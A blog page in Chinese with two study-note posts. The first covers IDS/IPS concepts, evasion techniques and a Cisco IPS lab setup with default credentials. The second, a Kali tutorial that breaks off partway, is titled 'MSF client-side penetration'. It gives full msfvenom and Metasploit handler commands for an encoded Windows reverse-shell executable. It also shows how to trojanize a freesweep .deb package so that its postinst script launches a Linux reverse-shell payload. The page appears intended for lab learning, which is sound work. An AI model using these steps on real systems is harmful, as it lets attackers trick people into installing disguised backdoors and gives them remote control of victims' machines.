<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;3&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/" itemprop="url">IPS笔记-1：IPS基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T23:46:03+08:00">
                2020-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-一个真实的蠕虫攻击"><a href="#1-一个真实的蠕虫攻击" class="headerlink" title="1. 一个真实的蠕虫攻击"></a>1. 一个真实的蠕虫攻击</h4><ul>
<li>扫描，发现主机</li>
<li>向目标主机发送溢出报文，控制目标机</li>
<li>获取目标机控制权</li>
<li>目标机发攻击<ul>
<li>向新受害者发起攻击，最终形成规模攻击</li>
<li>将真正攻击者隐藏，增加追查难度</li>
</ul>
</li>
<li>▲ 蠕虫病毒具有自传播性，可以感染整个内网，不同于其他的病毒</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=e284j6QmeWJRvDie_siyUe73O3szRjoMRw1OC0YIEV0cbecwdYy1JR5Pdg2Fnwqosz-rGFd_cuOkLW6yGcUak0tytYw72M-AmAUdsbOcS1hc0vB4YJ4aem_Yv5OXFzI4R9OGGKh108rSn_I-MNz0fLA&file_name=/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB.png" alt="蠕虫病毒攻击"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0d135laT_e9iOm2Iry1jqdOTP8W81bZ_gk5jBh3PhCM4JjaNVzZ1uDtG3HyY3WpNXlkpa0vN4wuI-HW-Qi2yTGe9MtvI3XHstNo6D5aaae95KCSar4JpECwhutvIuOdxYyAH80F4GawdpdKQ1PbUwOs-Ga7RDfSN61oZWWc&file_name=/%E5%95%86%E4%B8%9A%E5%8C%96%E9%98%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" alt="商业化防攻击解决方案"></p>
<h4 id="2-IDS产品"><a href="#2-IDS产品" class="headerlink" title="2. IDS产品"></a>2. IDS产品</h4><ul>
<li>IDS定义：Intrusion Detection System，入侵检测系统<ul>
<li>An intrusion detection system has the capability to <strong>detect</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IDS的两个关键特征<ul>
<li>实现应用层威胁识别，提供对网络数据的“监视功能”</li>
<li>旁路部署，与防火墙配合实现安全防范</li>
</ul>
</li>
<li>IDS优势<ul>
<li>IDS不影响网络</li>
<li>IDS的损坏不会影响到网络的功能</li>
<li>一旦超过了IDS的处理能力不会影响到网络流量，虽然这些数据不能够被IDS分析</li>
</ul>
</li>
<li>IDS问题<ul>
<li>IDS response action不能够阻止初始化包，也不能够保证阻止一个连接，IDS的响应技术能够比较好的阻止一个攻击者而不是一个攻击（Reset，Block）</li>
<li>IDS更容易受到网络逃避技术的攻击</li>
</ul>
</li>
<li><strong>注意</strong><ul>
<li>▲ IDS一般用于全流量镜像分析</li>
</ul>
</li>
</ul>
<h4 id="3-IPS产品"><a href="#3-IPS产品" class="headerlink" title="3. IPS产品"></a>3. IPS产品</h4><ul>
<li>IPS定义：Intrusion Prevention System，入侵防御系统<ul>
<li>An intrusion detection system has the capability to <strong>detect and prevent</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IPS的两个关键特征<ul>
<li>深入七层的数据流攻击特征检测<ul>
<li>蠕虫、基于Web的攻击、利用漏洞的攻击、网页篡改、木马、病毒、P2P滥用、DoS/DDoS等</li>
</ul>
</li>
<li>在线部署，实时阻断攻击</li>
</ul>
</li>
<li>IPS优势<ul>
<li>IPS deny action能够阻止触发包，后续数据包，或者所有源至于攻击者的包</li>
<li>IPS能够使用流量规范化技术，减少或者消除很多网络逃避技术</li>
<li>IPS能够有效的阻止蠕虫</li>
</ul>
</li>
<li>IPS问题<ul>
<li>IPS的错误或者损坏会影响到网络的流量</li>
<li>一旦超过了IPS的处理能力，会影响到网络的正常工作</li>
<li>IPS会影响到对时间敏感的运用程序，例如VOIP</li>
</ul>
</li>
<li>衡量IPS的标准<ul>
<li>False positive（错报）</li>
<li>False negative（漏报）</li>
</ul>
</li>
<li>⭐ IPS三种接口类型<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入<ul>
<li>IPS工作模式</li>
</ul>
</li>
</ul>
</li>
<li>Promiscuous-Mode Protection：IDS</li>
<li>Inline-Mode Protection：IPS</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=44cbT-wPM_Vv23Ww-TURqwwHSJb3dTcVW4vHcmwRJ_3ZTyo8Ot6ErFEhoqr2YDj5XTz7Q7alpYO_cV6HHvwfeLfVjAmElg03HyFTRceJRoB4nP1C3gcdHM9uL7FotJEprmp49uTBO2kfU55ESA&file_name=/IPS--IDS%E9%83%A8%E7%BD%B2.png" alt="IPS--IDS部署"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=fe16_qyGW7FVih7me_ZyhWk0qPlqtd-LTNSP4mr2jIILjBzHMg9zuax40fbYI2U4_qsWLEGdIZkTb3MfFyGqQm1yLsMfKZLKyfQh0hBU5196usmJm6kB6J_W6Q7SHvIXBQqNuduxMEbtsftwDA&file_name=/IPS--IPS%E9%83%A8%E7%BD%B2.png" alt="IPS--IPS部署"></p>
<ul>
<li><strong>注意</strong>：<ul>
<li>▲ 可以单一部署IPS</li>
<li>▲ IPS可以类比于外部的AV查杀软件</li>
</ul>
</li>
</ul>
<h4 id="4-IPS-IDS技术发展历程"><a href="#4-IPS-IDS技术发展历程" class="headerlink" title="4. IPS/IDS技术发展历程"></a>4. IPS/IDS技术发展历程</h4><ul>
<li>1987年，入侵安全检测专家系统模型的提出</li>
<li>1988年，Morris蠕虫的爆发，促进了IDS开发研制</li>
<li>1990年，网络IDS–NSM（网络安全监视）用来检测所监视的广域网的网络流量的可疑行为</li>
<li>1998年，开源IDS：Snort</li>
<li>2000年，非IDS厂商提出IPS概念，并发布产品</li>
<li>2003年，主流开始使用IPS</li>
</ul>
<h4 id="5-IPS、IDS、防火墙"><a href="#5-IPS、IDS、防火墙" class="headerlink" title="5. IPS、IDS、防火墙"></a>5. IPS、IDS、防火墙</h4><ul>
<li>在网络环境中，FW、IPS一前一后部署，形成纵深的立体防御</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=15b6QPvjOjTJlUcmuAr4-DOWYcbqE1KwiROyeIO8bSn-X8OfcRgqKFdecpY_PFdkJG8IHfcj0gfW8jwLDLMQAvGFBP0PAkbwIqBi2mofdZJZO4dle_vkdg4MbpvriATInScP8JWwpBIZmAxH87cJrc0YKavHAxY&file_name=/IPS%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与防火墙的比较"></p>
<ul>
<li>由于IDS与生俱来的缺陷，IPS必将全面取代IDS。DPtech IPS 2000可以同时实现IPS/IDS</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=071eP1Md5n_ZxiyscToj5uCQ5dr7aa8QktRctL9sCS9DlOjqokHokguFwYyd4cp_hV6JnbncnJxtuIHwRmfEnoqduYGQYcBxULbR5Q9cBJJkAWDRX5ZVWU9ANgBYVulKQF6mmxl6lz_bfXWBttxpoPw&file_name=/IPS%E4%B8%8EIDS%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与IDS的比较"></p>
<ul>
<li>防火墙主要提供安全区域隔离、访问控制和VPN功能、不能有效检测并阻断夹杂在正常流量中的应用层攻击代码<ul>
<li>DMZ区域对外提供服务</li>
</ul>
</li>
<li>IDS由于旁路部署，侧重安全状态监控，需要和防火墙联动才能抵御威胁，适用于“事后审计”，无法满足实时安全防护</li>
<li>IPS在线部署、主动防御、实时阻断攻击</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=23a2Q0jiQZ17q8iSp7-M0bROS4SM3b6ukxFH5Y_Jh7FS6nUKsTE_cqCFlF7BsRQbY1gSMiH-17ciPLB9DCdKmgUW627vx2srT_LYh4B4yxofApGW120bkTaFfiOYrVbStF3kzQul-vUCgycmfeiEIS-5q-I&file_name=/IPS%E3%80%81IDS%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="IPS、IDS、防火墙"></p>
<h4 id="6-⭐-技术介绍"><a href="#6-⭐-技术介绍" class="headerlink" title="6. ⭐ 技术介绍"></a>6. ⭐ 技术介绍</h4><ul>
<li>Profile-Based Intrustion Detection<ul>
<li>特点：定义正常流量，其余均为非法流量</li>
<li>优点：黑客很难判断什么是合法流量，能够发现最新的还没被公布的攻击</li>
<li>缺点：很难规定正常流量，告警很难理解，错误误报很多</li>
<li>产品：主机IPS（CSA）</li>
</ul>
</li>
<li>Signature-Based Intrusion Detection<ul>
<li>特点：通过Signaure（特性代码）匹配攻击</li>
<li>优点：架构很容易，告警很容易理解，能够自定义Sig</li>
<li>缺点：不能检测未被公布的攻击，需要经常升级，需要Cache流量</li>
<li>产品：网络IPS（4215，4240….）</li>
</ul>
</li>
<li>Protocol Analysis<ul>
<li>特点：基于RFC或者安全规范监控协议</li>
<li>产品：防火墙的运用层监控</li>
</ul>
</li>
</ul>
<h4 id="7-⭐-躲避手段"><a href="#7-⭐-躲避手段" class="headerlink" title="7. ⭐ 躲避手段"></a>7. ⭐ 躲避手段</h4><ul>
<li>Flooding（泛洪攻击）<ul>
<li>逃避手段：制造大量超出IPS处理能力的流量，掩护非法流量穿越IPS</li>
</ul>
</li>
<li>Frametation（分片）<ul>
<li>逃避手段：制造大量分片耗尽IPS缓存，实施对IPS的DoS，掩护非法分片流量</li>
</ul>
</li>
<li>Encryption（加密）<ul>
<li>逃避手段：加密攻击流量</li>
<li>例如：通过木马控制客户端发起加密流量到攻击者</li>
</ul>
</li>
<li>Obfuscation（困惑）<ul>
<li>逃避手段：攻击者通过不同的编码方式来逃避IPS检测</li>
<li>例如：@法#轮￥功%</li>
</ul>
</li>
</ul>
<h4 id="8-Cisco-4240"><a href="#8-Cisco-4240" class="headerlink" title="8. Cisco 4240"></a>8. Cisco 4240</h4><ul>
<li>Cisco 4240正面板<ul>
<li>Cisco的IPS与防火墙外观相同，仅简介不同</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=27409mwK21bC_Cfuum294IA89Ft8vh2hd2hozSf1JEFVHyH0F0165J3IdI5_WYlxAaTXJe85KwxyKkhbUOfFH_5aFbUqUeNoxQncW8mTFOwZHQH4RmILZKU10igh_d3lADzj5xYaLS0PeazY3g&file_name=/Cisco%E6%AD%A3%E9%9D%A2%E6%9D%BF.png" alt="Cisco正面板"></p>
<ul>
<li>Cisco 4240背面板<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=369dJXi3GfbYDQlpT79NnBJ3vq5U_n6ynDLmJSOkqeih_vzZG-nR5kJTn-LSFnacd-fgTvr6HWB_25Hm4ROEkOOMWSp61fHEa_h9smz5XKxh7WLDFiSiioDIn5c8Jkw-UUKFDRGUnj6zl9hQ7w&file_name=/Cisco%E8%83%8C%E9%9D%A2%E6%9D%BF.png" alt="Cisco背面板"></p>
<h4 id="9-实验"><a href="#9-实验" class="headerlink" title="9. 实验"></a>9. 实验</h4><ul>
<li>GNS3 0.8.6（傻瓜式安装）<ul>
<li>需要安装Winpcap 4.1.3</li>
<li>需要安装Wireshark 1.10.2（32bit）</li>
<li>导入ISO<ul>
<li>Edit → IOS and Hypervisors → Image file → bin文件 → save</li>
<li>导入路径不能有中文字符</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=706aVgYmdqzPGteriMxwZ-Z7zD40GuvwARwckyvIXSf3gjIfRwFplvuU7ttWtC77b-Wo2nfYJbFojx9GIn_ihvxROX0I5oEmpo922cTdo850IEsjXDQ6aJ0QGDSk9QwfRT8o70elHGbPZ-sYbNPO&file_name=/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS3配置成功"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=01b7L4Ehk8k5tK5K7rdIpqy7JyuNFtgM86k8GU2GDc-N3YLdCF2F90ugY8ZipaO8_NDp9CbSuMCqgp-raWqq4VDMGiX4N-EBvzGd7C49D-51UQJtcZ58kNfN_HhL0D76RFKe6hVC5eeGm3NfvAR0&file_name=/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS导入镜像成功"></p>
<ul>
<li>SecureCRT_6.5.3.490（傻瓜式安装）<ul>
<li>可以自定义安装，不占C盘资源空间</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=121739saVypv-dU14ijaICrfcltkD7N6pD7kO5VQzErwbdoZrZkzWlkvcpb3I-qANGiHg6Jn9_Sw2f_d6ziFGgmWam2T3h7_2iaSWKoV9DiGD7-UY4VMNSj_iMwsg4TK1f27TUMhs1iGcCrKQ7Km1N6JzaU&file_name=/SecureCRT%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="SecureCRT配置成功"> </p>
<ul>
<li>IPS-4240<ul>
<li>导入ova文件，设置新虚拟机位置<ul>
<li>账号：cisco</li>
<li>密码：ciscoips123</li>
</ul>
</li>
<li>网络适配器：自定义（VMnet8(NAT模式)）</li>
<li>网络适配器2：自定义VMnet2</li>
<li>网络适配器3：自定义VMnet3</li>
<li>网络适配器4：桥接模式（自动）</li>
<li>网络适配器5：桥接模式（自动）</li>
<li>新增串行端口：使用命名的管道:\.\pipe\842-1</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5aa9OxjvpfUe-hD0QR0nQ8fOIBcep6tL7DCJ5_vo1RXXES-GnmqH5_Qj9k2UBWWIPSKPdGDZn7wXcqLEki4wRdtHVPGzYqTlxK7HUOm9XjaaXVoEi92G5pP13Hul_5NnaGNQvdybvh5HyGK4SPw&file_name=/IPS%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS配置成功"></p>
<ul>
<li>Piped.exe（用MFC开发）<ul>
<li>模拟IPS串行端口</li>
<li>输入Pipe和自定义Port</li>
</ul>
</li>
</ul>
<p>！<a href="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=3725P9R42nRiK9QG2b6JwrjRMUuE0xPuC3D-wm3-dlZecPu-WZWgvOYOxH8dMmHWbahjqTdXl5eDL5iP_cDdhTU9-pqLk_R0e0R-UpYTHU3kGS1Hy7qyydpqQwzc4dbSmotDFvoh-eoSsxzVS5uBug&file_name=/Piped%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" target="_blank" rel="noopener">Piped配置成功</a></p>
<ul>
<li>SecureCRT连接<ul>
<li>新建快速连接<ul>
<li>协议：Telnet</li>
<li>主机名：127.0.0.1</li>
<li>端口：在Piped自定义的Port</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=be66k7swSlY87CU4iX8OInWGVbCT-5huyIR5_tv0Y5A9X04EytgemiQ1BKywp5PUT-XjqK0aZEzikgO_BVHCQFub3UtN96UOWhKDPc_54Cn1rg4kWx0P9GStdXHm7NlIQPMXx9cK9WfcvlYdFCfAS1oZ6HI&file_name=/SecureCRT%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="SecureCRT连接成功"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94)%EF%BC%9AMSF--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94)%EF%BC%9AMSF--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" itemprop="url">Kali Linux笔记(一百零五)：MSF--客户端渗透</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T15:26:33+08:00">
                2020-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf–客户端渗透"><a href="#1-Msf–客户端渗透" class="headerlink" title="1. Msf–客户端渗透"></a>1. Msf–客户端渗透</h4><ul>
<li>在无法突破网络边界的情况下转而攻击客户端<ul>
<li>社会工程学攻击</li>
<li>进而渗透线上业务网络</li>
</ul>
</li>
<li>含有漏洞利用代码的WEB站点<ul>
<li>利用客户端漏洞</li>
</ul>
</li>
<li>含有漏洞利用代码的DOC、PDF等文档</li>
<li>诱骗被害者执行Payload</li>
</ul>
<h4 id="2-诱骗被害者执行Payload（Windows）"><a href="#2-诱骗被害者执行Payload（Windows）" class="headerlink" title="2. 诱骗被害者执行Payload（Windows）"></a>2. 诱骗被害者执行Payload（Windows）</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom --payload-options -p windows/shell/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：cp /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP/1.exe，下载并保存" target="_blank" rel="noopener">http://Kali的IP/1.exe，下载并保存</a></li>
<li>在Kali服务器端准备好后，执行1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
</ul>
<h4 id="3-诱骗被害者执行Payload（Linux-Deb包）"><a href="#3-诱骗被害者执行Payload（Linux-Deb包）" class="headerlink" title="3. 诱骗被害者执行Payload（Linux Deb包）"></a>3. 诱骗被害者执行Payload（Linux Deb包）</h4><ul>
<li>Bodhi<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>依赖文件：/var/cache/apt/archives/</li>
<li><strong><code>🔺命令：apt-get --download-only install freesweep_0.90-1_i386.deb</code></strong></li>
<li><strong><code>🔺命令：cp freesweep_0.90-1_i386.deb /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：cd /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：dpkg -x freesweep_0.90-1_i386.deb free</code></strong></li>
<li><strong><code>🔺命令：mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></strong></li>
<li><strong><code>🔺命令：vi control</code></strong><ul>
<li>Package:freesweep</li>
<li>Version:0.90-1</li>
<li>Section:Games and Amusement</li>
<li>Priority:optional</li>
<li>Architecture:i386</li>
<li>Maintainer:Ubuntu MOTU Developers(<a href="mailto:ubuntu-motu@lists.ubuntu.com" target="_blank" rel="noopener">ubuntu-motu@lists.ubuntu.com</a>)</li>
<li>Description:a text-based minesweeper</li>
<li>Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display in Linux console,in an xterm,and in most text-based terminals currently in use.</li>
</ul>
</li>
<li><strong><code>🔺命令：vi postinst</code></strong> <ul>
<li>#!/bin/sh </li>
<li>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/ freesweep_scores &amp; /usr/games/freesweep &amp;</li>
</ul>
</li>
<li><strong><code>🔺命令：chmod +x postinst</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></strong></li>
<li><strong><code>🔺命令：chmod 755 postinst</code></strong></li>
<li><strong><code>🔺命令：dpkg-deb --build /root/free</code></strong></li>
<li><strong><code>🔺命令：cp /root</code></strong></li>
